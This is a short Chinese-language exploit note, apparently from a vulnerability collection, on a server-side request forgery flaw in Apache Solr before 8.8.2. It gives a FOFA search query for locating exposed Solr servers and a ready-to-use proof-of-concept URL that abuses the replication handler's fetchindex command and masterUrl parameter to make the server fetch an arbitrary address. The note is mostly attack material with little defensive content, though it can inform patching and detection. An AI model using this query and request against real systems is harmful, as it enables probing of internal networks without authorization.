# Apache Solr SSRF漏洞

## 漏洞描述

Apache Solr存在服务器端请求伪造漏洞。攻击者可以传递特定参数，使得服务端发起请求，成功利用该漏洞可造成内网信息探测。

## 漏洞影响

```
Apache Solr < 8.8.2
```

## FOFA

```
app="APACHE-Solr"
```

## 漏洞POC

```
# 这里masterUrl为你想访问的链接
http://127.0.0.1:8983/solr/db/replication\?command=fetchindex\&masterUrl=http://xxxx
```

